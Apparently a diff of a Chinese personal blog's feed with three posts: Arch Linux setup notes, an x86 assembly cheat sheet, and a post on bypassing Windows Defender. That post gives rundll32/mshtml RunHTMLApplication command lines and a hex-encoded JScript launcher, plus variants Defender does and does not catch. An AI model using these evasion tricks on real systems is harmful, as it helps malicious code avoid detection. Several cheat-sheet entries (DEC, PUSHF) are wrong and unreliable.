+<ul>
+<li>paru配置</li>
+</ul>
+<pre><code>$ sudo vim /etc/paru.conf
+-------------------------
+...
+DevelSuffixes = -git -cvs -svn -bzr -darcs -always -hg
+#AurOnly
+BottomUp	# 取消第17行BottomUp的注释
+#RemoveMake
+...
+-------------------------
+</code></pre>
+<ul>
+<li>wps</li>
+</ul>
+<pre><code>$ paru wps
+----------
+...
+12 aur/wifite-mod-pixiewps-git 67.cb8a19e-3 [+10 ~0.00]
+    A tool to attack multiple WEP and WPA encrypted networks at the same time mod with Pixie Dust Attack support
+11 aur/wps-office-mui-zh-cn 11.1.0.10702-2 [+19 ~1.73] [Installed]
+    Chinese (Simplified) mui package for WPS Office
+10 aur/wps-office-mime-cn 11.1.0.10702-2 [+19 ~1.73]
+    Mime files provided by Kingsoft Office (WPS Office) cn version
+ 9 aur/wps-office-cn 11.1.0.10702-2 [+19 ~1.73] [Installed]
+    Kingsoft Office (WPS Office) CN version - an office productivity suite
+...
+----------
+:: Packages to install (eg: 1 2 3, 1-3):
+:: 9 11	# 安装9 11 一个是wps,一个是wps的字体
+</code></pre>
+<ul>
+<li>udisk2 udiskie 是关于U盘等设备自动挂载的软件</li>
+<li>pcmanfm 是有图形化界面的文件管理器</li>
+</ul>
+<pre><code>$ sudo pacman -S  udisk2 udiskie   pacmanfm
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[绕过defender检测]]></title>
+        <id>https://Zer0-hex.github.io/post/rao-guo-defender-jian-ce/</id>
+        <link href="https://Zer0-hex.github.io/post/rao-guo-defender-jian-ce/">
+        </link>
+        <updated>2022-09-09T14:22:22.000Z</updated>
+        <content type="html"><![CDATA[<p>360就算了，360看到rundll32.exe就爆毒了。</p>
+<p>在exploit-db上发现一个外国大佬写的绕过wdf检测。<br>
+链接：https://www.exploit-db.com/exploits/50654</p>
+<p>他的失效了，所以我延续他的思路整了个新的。</p>
+<ul>
+<li>命令执行绕过</li>
+</ul>
+<p>路径混淆</p>
+<pre><code>C:\&gt;rundll32.exe javascript:&quot;\..\..\..\mshtml,RunHTMLApplication &quot;;alert(666)
+</code></pre>
+<p>但是已经被wdf捕获了特征。</p>
+<ul>
+<li>shellcode绕过方法</li>
+</ul>
+<p>十六进制编码</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;component&gt;
+&lt;script&gt;
+&lt;![CDATA[
+var hex = &quot;6E657720416374697665584F626A6563742822575363726970742E5368656C6C22292E52756E282263616C632E6578652229&quot;;
+var str = '';
+for (var n = 0; n &lt; hex.length; n += 2) {
+str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+}
+eval(str)
+]]&gt;
+&lt;/script&gt;
+&lt;/component&gt;
+</code></pre>
+<p>目前也已经被wdf捕获。</p>
+<h2 id="新的绕过方法">新的绕过方法</h2>
+<p>这位大佬给我提供了思路，我在尝试绕过时发现wdf的一些特性：</p>
+<ol>
+<li>针对拆分的命令不会检测。</li>
+<li>针对组合的函数调用，不加参数，会被检测。</li>
+<li>针对错误的语法(或者说wdf内未出现的语法)不会检测。</li>
+</ol>
+<ul>
+<li>以下都是安全的命令(有些可能无法执行)：</li>
+</ul>
+<pre><code>C:\&gt; rundll32.exe
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\mshtml,&quot;
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplicatio&quot;;alert(2333)      # RunHTMLApplication少了个n 
+C:\&gt; javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication,,,&quot;;alert(2333)
+C:\&gt; rundll32.exe mshtml RunHTMLApplication
+</code></pre>
+<ul>
+<li>以下情况是会被检测到的</li>
+</ul>
+<pre><code>C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication &quot;
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication &quot;;alert(2333)
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication,,,&quot;
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\\\\\mshtml,RunHTMLApplication&quot;;alert(2333)
+</code></pre>
+<ul>
+<li>结论</li>
+</ul>
+<pre><code>wdf先对语法检测，通过才可以执行。
+rundll32.exe mshtml RunHTMLApplication 同时出现时不会被检测到
+</code></pre>
+<h2 id="新的绕过方法-2">新的绕过方法</h2>
+<ul>
+<li>命令执行绕过</li>
+</ul>
+<pre><code>rundll32.exe javascript:&quot;\..\..\..\mshtml,,RunHTMLApplication &quot;;alert(2333)
+</code></pre>
+<ul>
+<li>Shellcode绕过</li>
+</ul>
+<pre><code>简单的字符串分段相加即可，So easy。
+</code></pre>
+<p>记得用cmd运行。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[X86常用汇编指令速查表]]></title>
+        <id>https://Zer0-hex.github.io/post/x86-chang-yong-hui-bian-zhi-ling-su-cha-biao/</id>
+        <link href="https://Zer0-hex.github.io/post/x86-chang-yong-hui-bian-zhi-ling-su-cha-biao/">
+        </link>
+        <updated>2020-12-12T16:35:54.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="数据传送指令">数据传送指令</h2>
+<p>🙄</p>
+<h3 id="通用数据传送指令">通用数据传送指令</h3>
+<h4 id="mov">MOV</h4>
+<ul>
+<li>格式：<code>MOV dst,src</code></li>
+<li>功能：将<code>src</code>传送到<code>dst</code></li>
+<li>限制：段寄存器间不可直接相互传送，立即数不能直接送段寄存器，CS 不可作为目的操作数。</li>
+</ul>
+<h4 id="push-pop">PUSH &amp; POP</h4>
+<ul>
+<li>格式：<code>PUSH src</code> &amp; <code>POP dst</code></li>
+<li>功能：将 <code>src</code> 压栈 &amp; 出栈送入 <code>dst</code></li>
+<li>限制：CS 不可作目的操作数</li>
+</ul>
+<h4 id="xchg">XCHG</h4>
+<ul>
+<li>格式：<code>XCHG dst,src</code></li>
+<li>含义：交换两者（Exchange）</li>
+<li>限制：段寄存器不可为操作数，也不能同时为存储单元</li>
+</ul>
+<h4 id="xlat">XLAT</h4>
+<ul>
+<li>格式：<code>XLAT</code></li>
+<li>含义：转换表（Table Look-up Translation）</li>
+<li>功能：用 AL 内容查表，结果存回 AL，表格位于 DS:BX</li>
+</ul>
+<hr>
+<h3 id="地址目标传送指令">地址目标传送指令</h3>
+<h4 id="lea">LEA</h4>
+<ul>
+<li>格式：<code>LEA dst,src</code></li>
+<li>含义：取有效地址（Load Effective Address）</li>
+<li>功能：取<code>src</code>地址偏移量送<code>dst</code></li>
+<li>注：源操作数必须是存储单元，目的操作数必须是除段寄存器之外的 16 位寄存器。</li>
+</ul>
+<h4 id="lds-les">LDS &amp; LES</h4>
+<ul>
+<li>格式：<code>LDS dst,src</code> &amp; <code>LES dst,src</code></li>
+<li>含义：取双字指针送到目的寄存器和 DS/ES</li>
+<li>功能：从源操作数指定的存储单元中取出 4 字节，前两个字节送到目的寄存器，后两个字节送到 DS/ES。</li>
+</ul>
+<hr>
+<h3 id="标志传送指令">标志传送指令</h3>
+<h4 id="pushf-popf">PUSHF &amp; POPF</h4>
+<ul>
+<li>格式：<code>PUSHF</code> &amp; <code>POPF</code></li>
+<li>含义：将标志寄存器压栈/出栈</li>
+<li>功能：从源操作数指定的存储单元中取出 4 字节，前两个字节送到目的寄存器，后两个字节送到 DS/ES。</li>
+</ul>
+<h4 id="lahf-sahf">LAHF &amp; SAHF</h4>
+<ul>
+<li>格式：<code>LAHF</code> &amp; <code>SAHF</code></li>
+<li>含义：Load(Store) AH from(into) Flags</li>
+<li>功能：将标志寄存器送到 AH &amp; 将 AH 送到标志寄存器</li>
+</ul>
+<hr>
+<h3 id="输入输出指令">输入输出指令</h3>
+<h4 id="in-out">IN &amp; OUT</h4>
+<ul>
+<li>格式：<code>IN AL/AX, ADDR</code> &amp; <code>OUT ADDR, AL/AX</code></li>
+<li>功能：从端口地址（寄存器）获取数据送到寄存器（端口地址）</li>
+<li>地址格式：端口地址有两种格式，小于 FFH 时可以是直接写出，否则必须先送入 DX 再使用。</li>
+</ul>
+<hr>
+<h2 id="算术运算指令">算术运算指令</h2>
+<h3 id="加减法指令">加减法指令</h3>
+<h4 id="add-adc">ADD &amp; ADC</h4>
+<ul>
+<li>格式：<code>ADD dst,src</code> &amp; <code>ADC dst,src</code></li>
+<li>含义：（带进位）加法</li>
+<li>功能：dst = src + dst (+ CF)</li>
+</ul>
+<h4 id="inc">INC</h4>
+<ul>
+<li>格式：<code>INC dst</code></li>
+<li>功能：自增 1，dst = dst + 1</li>
+</ul>
+<h4 id="sub-sbb">SUB &amp; SBB:</h4>
+<ul>
+<li>格式：<code>SUB dst,src</code> &amp; <code>SBB dst,src</code></li>
+<li>含义：（带借位）减法</li>
+<li>功能：dst = dst - src (- CF)</li>
+</ul>
+<h4 id="dec">DEC:</h4>
+<ul>
+<li>格式：<code>DEC dst</code></li>
+<li>功能：自减 1，dst = dst + 1</li>
+</ul>
+<h4 id="neg">NEG:</h4>
+<ul>
+<li>格式：<code>NEG dst</code></li>
+<li>功能：对目的操作数取负，dst = -dst</li>
+</ul>
+<hr>
+<h3 id="乘除法指令">乘除法指令</h3>
+<h4 id="mul-imul">MUL &amp; IMUL</h4>
+<ul>
+<li>格式：<code>IMUL src</code> &amp; <code>MUL src</code></li>
+<li>含义：无符号数/整数乘法</li>
+<li>功能：只有一个源操作数，当其为 8 位时，AX = AL * src，为 16 位时，（DX,AX）= AX * src</li>
+</ul>
+<h4 id="div-idiv">DIV &amp; IDIV</h4>
+<ul>
+<li>格式：<code>IDIV src</code> &amp; <code>DIV src</code></li>
+<li>含义：无符号数/整数乘法</li>
+<li>功能：只有一个源操作数作为除数，当其为 8 位时，AX 为被除数，AL 作为商，AH 作为余数。当 src 为 16 位时，（DX,AX）作为被除数，AX 作为商，DX 作为余数。</li>
+</ul>
+<hr>
+<h2 id="逻辑运算与移位指令">逻辑运算与移位指令</h2>
+<h3 id="逻辑运算">逻辑运算</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>NOT dst</code></td>
+<td style="text-align:center">取反，逻辑非</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>AND dst,src</code></td>
+<td style="text-align:center">逻辑与</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>OR dst,src</code></td>
+<td style="text-align:center">逻辑或</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>XOR dst,src</code></td>
+<td style="text-align:center">异或</td>
+</tr>
+</tbody>
+</table>
+<h3 id="算术逻辑移位">算术逻辑移位</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">含义</th>
+<th style="text-align:center">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>SAL dst,cnt</code></td>
+<td style="text-align:center">Shift Arithmetic Left</td>
+<td style="text-align:center">算术左移 cnt 位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>SAR dst,cnt</code></td>
+<td style="text-align:center">Shift Arithmetic Right</td>
+<td style="text-align:center">算术右移 cnt 位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>SHL dst,cnt</code></td>
+<td style="text-align:center">Shift Logic Left</td>
+<td style="text-align:center">逻辑左移 cnt 位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>SHR dst,cnt</code></td>
+<td style="text-align:center">Shift Logic Right</td>
+<td style="text-align:center">逻辑右移 cnt 位</td>
+</tr>
+</tbody>
+</table>
+<p>cnt 为 1 或者 CL。算术右移时补最高位，逻辑右移补 0，被移出的移入 CF。</p>
+<h3 id="循环移位">循环移位</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">含义</th>
+<th style="text-align:center">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>ROL dst,cnt</code></td>
+<td style="text-align:center">Rotate Left</td>
+<td style="text-align:center">循环左移 cnt 位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ROR dst,cnt</code></td>
+<td style="text-align:center">Rotate Right</td>
+<td style="text-align:center">循环右移 cnt 位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>RCL dst,cnt</code></td>
+<td style="text-align:center">Rotate through Carry Left</td>
+<td style="text-align:center">带进位左移 cnt 位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>RCR dst,cnt</code></td>
+<td style="text-align:center">Rotate through Carry Right</td>
+<td style="text-align:center">带进位右移 cnt 位</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="字符串操作指令">字符串操作指令</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令（字节/字）</th>
+<th style="text-align:center">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>MOVSB / MOVSW</code></td>
+<td style="text-align:center">字符串传送</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>CMPSB / CMPSW</code></td>
+<td style="text-align:center">字符串比较</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>SCASB / SCASW</code></td>
+<td style="text-align:center">字符串扫描</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>LODSB / LODSW</code></td>
+<td style="text-align:center">字符串装入</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>STOSB / STOSW</code></td>
+<td style="text-align:center">字符串存储</td>
+</tr>
+</tbody>
+</table>
+<p>对于后三条指令，操作使用 AL/AX 寄存器（根据操作数类型决定）。</p>
+<ul>
+<li>源串起始地址为 DS:SI，目的串位于 ES:DI</li>
+<li>每一次操作都会自动修改 SI 和 DI</li>
+<li>DF 标志位可以控制字符串处理方向，DF = 0 递增，DF = 1 递减，可通过 <code>CLD/STD</code> 设置</li>
+<li>处理字符串长度放在 CX 中</li>
+</ul>
+<p>这些指令前可以用重复前缀 <code>REP</code> 反复执行，或是 <code>REPE/REPZ</code> 相等/为零则重复，<code>REPNE/REPNZ</code> 不相等/非零则重复。</p>
+<hr>
+<h2 id="处理器控制指令">处理器控制指令</h2>
+<h3 id="标志处理指令">标志处理指令</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">含义</th>
+<th style="text-align:center">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>CLC</code></td>
+<td style="text-align:center">Clear Carry</td>
+<td style="text-align:center">CF = 0</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>CMC</code></td>
+<td style="text-align:center">Complement Carry</td>
+<td style="text-align:center">CF = NOT CF</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>STC</code></td>
+<td style="text-align:center">Set Carry</td>
+<td style="text-align:center">CF = 1</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>CLD</code></td>
+<td style="text-align:center">Clear Direction</td>
+<td style="text-align:center">DF = 0</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>STD</code></td>
+<td style="text-align:center">Set Direction</td>
+<td style="text-align:center">DF = 1</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>CLI</code></td>
+<td style="text-align:center">Clear Interrupt</td>
+<td style="text-align:center">IF = 0</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>STI</code></td>
+<td style="text-align:center">Set Interrupt</td>
+<td style="text-align:center">IF = 1</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="外部同步指令">外部同步指令</h3>
+<h4 id="esc">ESC</h4>
+<ul>
+<li>格式：<code>ESC 外部操作码，src</code></li>
+<li>功能：用来实现对 8087 协处理器控制。</li>
+</ul>
+<h4 id="wait">WAIT</h4>
+<ul>
+<li>格式：<code>WAIT</code></li>
+<li>功能：往往跟在 <code>ESC</code> 后等待，直到 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯TESTTEST¯ 为低电平。</li>
+</ul>
+<h4 id="lock">LOCK</h4>
+<ul>
+<li>格式：<code>LOCK</code></li>
+<li>功能：封锁总线，禁止其他处理器使用总线。</li>
+</ul>
+<hr>
+<h3 id="停机和空操作">停机和空操作</h3>
+<h4 id="hlt">HLT</h4>
+<ul>
+<li>格式：<code>HLT</code></li>
+<li>功能：进入暂停状态不进行任何操作，直到复位或 NMI 引脚/INTR 引脚出现中断请求信号。</li>
+</ul>
+<h4 id="nop">NOP</h4>
+<ul>
+<li>格式：<code>NOP</code></li>
+<li>功能：耗费三个时钟周期但不进行任何操作。</li>
+</ul>
+<hr>
+<h2 id="控制转移指令">控制转移指令</h2>
+<h3 id="比较指令">比较指令</h3>
+<h4 id="cmp">CMP</h4>
+<ul>
+<li>格式：<code>CMP dst,src</code></li>
+<li>功能：用 dst 减去 src，但结果仅反映到标志位，不送回目的操作数。</li>
+</ul>
+<h4 id="test">TEST</h4>
+<ul>
+<li>格式：<code>TEST dst,src</code></li>
+<li>功能：对两个操作数作逻辑与，结果仅反映到标志位，不送回目的操作数。</li>
+</ul>
+<hr>
+<h3 id="无条件转移">无条件转移</h3>
+<h4 id="jmp">JMP</h4>
+<ul>
+<li>格式：<code>JMP dst</code></li>
+<li>功能：无条件跳转到目的地址。</li>
+</ul>
+<p>跳转分为两种，一种是段内转移或近（NEAR）转移，跳转时仅改变 IP 的值，另一种是段间转移或远（FAR）转移，此时跳转长度超过 IP 最大值，CS 和 IP 都要改变。这两种情况都提供直接转移和间接转移两种方法，前者直接给出目的地址，后者将目的地址放在寄存器或者存储单元中。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">方式</th>
+<th style="text-align:center">寻址目标</th>
+<th style="text-align:center">举例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">直接</td>
+<td style="text-align:center">立即短转移（8位）</td>
+<td style="text-align:center"><code>JMP SHORT 标号</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">直接</td>
+<td style="text-align:center">立即近转移（16位）</td>
+<td style="text-align:center"><code>JMP NEAR PTR 标号</code>或<code>JMP 标号</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">间接</td>
+<td style="text-align:center">寄存器（16位）</td>
+<td style="text-align:center"><code>JMP BX</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">间接</td>
+<td style="text-align:center">存储器（16位）</td>
+<td style="text-align:center"><code>JMP WORD PTR 5[BX]</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段间</td>
+<td style="text-align:center">直接</td>
+<td style="text-align:center">立即转移（32位）</td>
+<td style="text-align:center"><code>JMP FAR PTR 标号</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段间</td>
+<td style="text-align:center">间接</td>
+<td style="text-align:center">存储器（32位）</td>
+<td style="text-align:center"><code>JMP DWORD PTR[REG]</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="call">CALL</h4>
+<ul>
+<li>格式：<code>CALL 过程名</code></li>
+<li>功能：调用过程。</li>
+</ul>
+<p>同样有段内与段间，直接与间接的区分，指令格式与 JMP 类似。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">方式</th>
+<th style="text-align:center">寻址目标</th>
+<th style="text-align:center">举例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">直接</td>
+<td style="text-align:center">立即调用</td>
+<td style="text-align:center"><code>CALL 标号</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">间接</td>
+<td style="text-align:center">寄存器（16位）</td>
+<td style="text-align:center"><code>CALL BX</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段内</td>
+<td style="text-align:center">间接</td>
+<td style="text-align:center">存储器（16位）</td>
+<td style="text-align:center"><code>CALL WORD PTR 5[BX]</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段间</td>
+<td style="text-align:center">直接</td>
+<td style="text-align:center">立即调用（32位）</td>
+<td style="text-align:center"><code>CALL FAR PTR 标号</code></td>
+</tr>
+<tr>
+<td style="text-align:center">段间</td>
+<td style="text-align:center">间接</td>
+<td style="text-align:center">存储器（32位）</td>
+<td style="text-align:center"><code>CALL DWORD PTR[REG]</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="ret">RET</h4>
+<ul>
+<li>格式：<code>RET (n)</code></li>
+<li>功能：过程返回。如果有 n 则在弹出返回地址后再弹出 n 个字节，这一目的是让调用过程可以传递参数。</li>
+</ul>
+<hr>
+<h3 id="条件转移">条件转移</h3>
+<ul>
+<li>格式：<code>操作符 标号</code></li>
+<li>功能：根据操作符，满足即跳转到标号。</li>
+</ul>
+<h4 id="直接标志转移">直接标志转移</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">测试条件</th>
+<th style="text-align:center">判断条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>JC</code>/<code>JNC</code></td>
+<td style="text-align:center">CF = 1 / 0</td>
+<td style="text-align:center">有 / 无进位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JZ</code>/<code>JNZ</code></td>
+<td style="text-align:center">ZF = 1 / 0</td>
+<td style="text-align:center">相等 / 不相等</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JE</code>/<code>JNE</code></td>
+<td style="text-align:center">ZF = 1 / 0</td>
+<td style="text-align:center">相等 / 不相等</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JS</code>/<code>JNS</code></td>
+<td style="text-align:center">SF = 1 / 0</td>
+<td style="text-align:center">符号为负 / 正</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JO</code>/<code>JNO</code></td>
+<td style="text-align:center">OF = 1 / 0</td>
+<td style="text-align:center">溢出 / 无溢出</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JP</code>/<code>JNP</code></td>
+<td style="text-align:center">PF = 1 / 0</td>
+<td style="text-align:center">为偶数 / 奇数</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JPE</code>/<code>JPO</code></td>
+<td style="text-align:center">PF = 1 / 0</td>
+<td style="text-align:center">为偶数 / 奇数</td>
+</tr>
+</tbody>
+</table>
+<h4 id="无符号数比较测试">无符号数比较测试</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">测试条件</th>
+<th style="text-align:center">判断条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>JA</code>/<code>JNBE</code></td>
+<td style="text-align:center">CF ∨∨ ZF = 0</td>
+<td style="text-align:center">高于 / 不低于等于</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JAE</code>/<code>JNB</code></td>
+<td style="text-align:center">CF = 0</td>
+<td style="text-align:center">高于等于 / 不低于</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JNAE</code>/<code>JB</code></td>
+<td style="text-align:center">CF = 1</td>
+<td style="text-align:center">不高于等于 / 低于</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JNA</code>/<code>JBE</code></td>
+<td style="text-align:center">CF ∨∨ ZF = 1</td>
+<td style="text-align:center">不高于 / 低于等于</td>
+</tr>
+</tbody>
+</table>
+<h4 id="有符号数比较测试">有符号数比较测试</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">指令</th>
+<th style="text-align:center">测试条件</th>
+<th style="text-align:center">判断条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>JG</code>/<code>JNLE</code></td>
+<td style="text-align:center">(SF XORXOR OF) ∨∨ ZF = 0</td>
+<td style="text-align:center">大于 / 不小于等于</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JGE</code>/<code>JNL</code></td>
+<td style="text-align:center">SF XORXOR OF = 0</td>
+<td style="text-align:center">大于等于 / 不小于</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JNGE</code>/<code>JL</code></td>
+<td style="text-align:center">SF XORXOR OF = 1</td>
+<td style="text-align:center">不大于等于 / 小于</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>JNG</code>/<code>JLE</code></td>
+<td style="text-align:center">(SF XORXOR OF) ∨∨ ZF = 1</td>
+<td style="text-align:center">不大于 / 小于等于</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="循环控制指令">循环控制指令</h3>
+<h4 id="loop">LOOP</h4>
+<ul>
+<li>格式：<code>LOOP 标号</code></li>
+<li>功能：跳至标号继续循环，每执行一次 CX 减一，若减一后为零则不跳转。</li>
+</ul>
+<h4 id="loope-loopne">LOOPE &amp; LOOPNE</h4>
+<ul>
+<li>格式：<code>LOOPE 标号</code> &amp; <code>LOOPNE 标号</code></li>
+<li>功能：（不）相等时循环，其他与 LOOP 相同。</li>
+</ul>
+<h4 id="loopz-loopnz">LOOPZ &amp; LOOPNZ</h4>
+<ul>
+<li>格式：<code>LOOPZ 标号</code> &amp; <code>LOOPNZ 标号</code></li>
+<li>功能：结果（不）为零时循环，其他与 LOOP 相同。</li>
+</ul>
+<h4 id="jcxz">JCXZ</h4>
+<ul>
+<li>格式：<code>JCXZ 标号</code></li>
+<li>功能：CX 为零则跳转，否则就往下执行， CS 不会减一。</li>
+</ul>
+<hr>
+<h3 id="中断指令">中断指令</h3>
+<h4 id="int">INT</h4>
+<ul>
+<li>格式：<code>INT n</code></li>
+<li>功能：调用 n 对应的功能。</li>
+</ul>
+<h4 id="into">INTO</h4>
+<ul>
+<li>格式：<code>INTO</code></li>
+<li>功能：如果溢出标识 OF 为 1 则产生类型为 4 的中断，否则就继续向下执行。</li>
+</ul>
+<h4 id="iret">IRET</h4>
+<ul>
+<li>格式：<code>IRET</code></li>
+<li>功能：中断返回。</li>
+</ul>
+<hr>
+<h2 id="bios-dos-调用">BIOS &amp; DOS 调用</h2>
+<p>调用这两者用的是 INT 中断指令。</p>
+<ul>
+<li>格式：<code>INT n</code></li>
+<li>功能：调用 n 对应的功能。</li>
+</ul>
+<p>其中 n = 21H 是最为强大的 DOS 中断。一般调用中断须先将参数放入指定寄存器，功能号放入 AH，子功能号放入 AL，例如</p>
+<pre><code>1 2 MOV AX,4C00H INT 21H 
+</code></pre>
+<p>常用的功能号有</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">功能号</th>
+<th style="text-align:center">功能</th>
+<th style="text-align:center">参数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">01H</td>
+<td style="text-align:center">输入一个字符</td>
+<td style="text-align:center">AL = 输入字符</td>
+</tr>
+<tr>
+<td style="text-align:center">0AH</td>
+<td style="text-align:center">输入字符串</td>
+<td style="text-align:center">DX:DX = 缓冲区首地址</td>
+</tr>
+<tr>
+<td style="text-align:center">02H</td>
+<td style="text-align:center">显示一个字符</td>
+<td style="text-align:center">DL = 显示字符</td>
+</tr>
+<tr>
+<td style="text-align:center">09H</td>
+<td style="text-align:center">显示 $ 结尾的字符串</td>
+<td style="text-align:center">DX:DX = 字符串首地址</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    </entry>
+</feed>
